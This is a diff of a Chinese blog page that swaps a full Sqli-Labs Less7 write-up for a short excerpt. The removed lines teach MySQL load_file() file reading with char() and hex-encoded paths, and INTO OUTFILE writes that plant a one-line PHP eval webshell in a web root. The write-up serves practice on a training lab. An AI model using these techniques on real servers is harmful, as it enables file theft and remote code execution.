@@ -566,43 +566,15 @@
 
       
         
-          
-            <p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="external">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
-<p>Less7 是 dump out file</p>
-<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>利用sql注入可以导入导出文件，获取文件内容，或向文件写入内容。</p>
-<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a>load_file()</h2><p>用于读取本地文件内容。有几个条件限制：</p>
-<ul>
-<li>需要有读取文件的权限</li>
-<li>需要知道文件的绝对物理路径。</li>
-</ul>
-<p>假设C盘里有一个TEST.txt文件，内容为chybeta。几种读取方式如下：</p>
-<h3 id="直接使用绝对路径"><a href="#直接使用绝对路径" class="headerlink" title="直接使用绝对路径"></a>直接使用绝对路径</h3><p>注意对路径中斜杠的处理。</p>
-<ul>
-<li>mysql&gt; select load_file(“C://TEST.txt”);</li>
-<li>mysql&gt; select load_file(“C:/TEST.txt”);</li>
-<li>mysql&gt; select load_file(“C:\TEST.txt”);</li>
-</ul>
-<p>以上返回结果如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------+</div><div class="line">| load_file(&quot;C://TEST.txt&quot;) |</div><div class="line">+---------------------------+</div><div class="line">| chybeta                   |</div><div class="line">+---------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
-<p>但若输入以下查询则会返回空即不成功。</p>
-<p>mysql&gt; select load_file(“C:\TEST.txt”);<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+--------------------------+</div><div class="line">| load_file(&quot;C:\TEST.txt&quot;) |</div><div class="line">+--------------------------+</div><div class="line">| NULL                     |</div><div class="line">+--------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
-<h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><h4 id="ASCII"><a href="#ASCII" class="headerlink" title="ASCII"></a>ASCII</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行ascii编码后利用char（）进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(char(67,58,92,92,84,69,83,84,46,116,120,116));</div></pre></td></tr></table></figure></p>
-<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------------------------+</div><div class="line">| load_file(char(67,58,92,92,84,69,83,84,46,116,120,116)) |</div><div class="line">+---------------------------------------------------------+</div><div class="line">| chybeta                                                 |</div><div class="line">+---------------------------------------------------------+</div><div class="line">1 row in set (0.02 sec)</div></pre></td></tr></table></figure></p>
-<h4 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h4><p>以<code>C:\\TEST.txt</code>为例。对其进行十六进制编码后进行查询：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select load_file(0x433a5c5c544553542e747874);</div></pre></td></tr></table></figure></p>
-<p>返回结果：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">+---------------------------------------+</div><div class="line">| load_file(0x433a5c5c544553542e747874) |</div><div class="line">+---------------------------------------+</div><div class="line">| chybeta                               |</div><div class="line">+---------------------------------------+</div><div class="line">1 row in set (0.00 sec)</div></pre></td></tr></table></figure></p>
-<h2 id="select"><a href="#select" class="headerlink" title="select"></a>select</h2><p>可以用来导出文件/数据到文件中。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SELECT * INTO OUTFILE &apos;file_name&apos;</div></pre></td></tr></table></figure></p>
-<p>file_name处一般要指定绝对路径，否则就会导出到mysql的目录下。同时对需导出的目录有可写权限。对file_name，可以有以下几种编码方式，注意对路径分隔符的处理：</p>
-<h3 id="数据导出"><a href="#数据导出" class="headerlink" title="数据导出"></a>数据导出</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:\\phpstudy\\WWW\\test\\1&apos;;</div><div class="line">Query OK, 1 row affected (0.09 sec)</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
-<p>这里是假设写入到文件1中。在实际测试中，要outfile出的文件不能已经存在，否则会报错。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select database() into outfile &apos;C:/phpstudy/WWW/test/1&apos;;</div><div class="line">ERROR 1086 (HY000): File &apos;C:/phpstudy/WWW/test/1&apos; already exists</div></pre></td></tr></table></figure></p>
-<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>outfile还可以用来写入webshell。前提是：</p>
-<ul>
-<li>需要知道网站的绝对物理路径，这样导出后的webshell可访问</li>
-<li>对需导出的目录有可写权限。</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mysql&gt; select &quot;&lt;?php eval($_POST[&apos;chybeta&apos;])?&gt;&quot; into outfile &apos;C:/phpstudy/WWW/test/webshell.php&apos;;</div><div class="line">Query OK, 1 row affected (0.00 sec)</div></pre></td></tr></table></figure>
-<p><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170712/1.jpg?raw=true" alt=""></p>
-
-          
+          <p>Sqli-Labs是用来练习sql注入的好平台。project地址：<a href="https://github.com/Audi-1/sqli-labs">https://github.com/Audi-1/sqli-labs</a><br>本文测试环境：使用phpstudy集成环境。mysql版本：5.5.53</p>
+<p>Less7 是 dump out file<br>
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2017/07/12/Sqli-Labs-Less7-writeup/#more" rel="contents">
+              阅读全文 &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
